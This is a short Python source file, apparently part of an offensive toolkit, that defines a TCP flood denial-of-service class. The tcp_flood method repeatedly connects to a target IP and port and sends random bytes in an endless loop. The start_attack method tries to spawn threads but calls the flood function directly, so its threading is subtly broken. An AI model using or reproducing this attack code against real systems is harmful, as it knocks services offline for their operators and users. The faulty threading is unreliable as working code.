import socket
import random
import os
import sys
import itertools
import string
import time
from threading import Thread
from src.utils import color_text
from src.dos.constants import TCP


class TCPDos():

    def __init__(self, target_ip, target_port, protocol, tcp_size_bytes=1024, thread_number=4):
        self.target_ip = target_ip
        self.target_port = target_port
        self.protocol = protocol
        self.tcp_size_bytes = tcp_size_bytes
        self.thread_number = thread_number

    def tcp_flood(self):
        try:
            while True:
                sock = socket.socket(socket.AF_INET, TCP)
                sock.connect((self.target_ip, self.target_port))
                bytes_to_send = random._urandom(self.tcp_size_bytes)
                sock.sendall(bytes_to_send)
        except Exception as e:
            color_text('red', f'[!] Error in tcp_flood: {e}')

    def start_attack(self):
        """
        Manage threads and choose attack method
        """
        threads = []
        try:
            if self.protocol != False and self.protocol != '':
                for _ in range(self.thread_number):
                    thread = Thread(target=self.tcp_flood())
            else:
                print('Bad method')
                return

        except Exception as e:
            color_text('red', f'[!] Error: {e}')
